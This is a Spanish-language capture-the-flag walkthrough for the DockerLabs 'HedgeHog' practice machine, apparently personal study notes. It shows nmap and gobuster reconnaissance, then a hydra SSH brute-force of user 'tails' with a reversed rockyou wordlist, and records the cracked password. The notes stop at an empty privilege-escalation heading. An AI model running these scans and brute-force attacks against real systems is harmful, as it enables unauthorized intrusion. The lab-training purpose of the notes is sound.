plataforma: https://dockerlabs.es/#/
Mirror: https://mega.nz/file/ic9VwYZJ#Hr1BjW2axoSRmUYbxhldmTNiYtBV9TQU83JDJPpoYww
Nombre: HedgeHog
Dificultad: muy fácil
Creador: AnkbNikas

Tools:
[[Docker]]
[[Ping]]
[[NMAP]]
[[Gobuster]]



# Despliegue:
```sh fold:"Deploy injection machine"
sudo bash autodeploy.sh hedgehog.tar
```

![[Dockerlabs - HedgeHog - Reconocimiento.png]]
# Reconocimiento

## Ping:

```sh fold:"Deploy injection machine"
ping -c1 172.17.0.2
```

![[Dockerlabs - JedgeHog - Ping.png]]

TRL: 64 --> Linux

## lanzamos un nmap:

```sh fold:"Reconocimiento con nmap"
sudo nmap -sS -p- -sC -sV -Pn 172.17.0.2
```

![[Dockerlabs - HedgeHog - nmap result.png]]

Puertos abiertos
22 --> SSH
80 --> HHP

entramos en el navegador con el puerto 80 y vemos si encontramos alguna web interesante:
![[Dockerlabs -HedgeHog - WebSite.png]]

revisamos el código fuente por si encontramos algo:
![[Dockerlabs - hedgeHog - Web codigo fuente.png]]
Pero no damos con nada interesante

Intentamos sacar rutas con gobuster
```sh fold:"Reconocimiento con gobuster"
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2 --add-slash
```

![[Dockerlabs - HedgeHog - Gobuster result.png]]
# Explotación / intrusión
lanzamos un hydra con el usuario que vimos en la web: tails
```sh fold:"hydra fuerta bruta al ssh con usuario tails"
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![[Dockerlabs - HedgeHog -Rockyou normal.png]]
pero no encontramos nada, al ver el nombre del usuario tails: se nos ocurre invertir el rockyou
comandos para invertir el rockyou:

```sh fold:"Invertir el rockyou"
# invertimos
tac rockyou.txt >> rockyouinvertido.txt
# eliminamos los espacios
sed -i 's/ //g' rockyouinvertido.txt 
```

Volvemos a lanzar hydra con el rockyou invertido:
```sh fold:"hydra fuerta bruta al ssh con usuario tails"
hydra -l tails -P /usr/share/wordlists/rockyouinvertido.txt ssh://172.17.0.2
```


Datos obtenidos:
Usuario: tails
Password: 3117548331
# Escalada de privilegios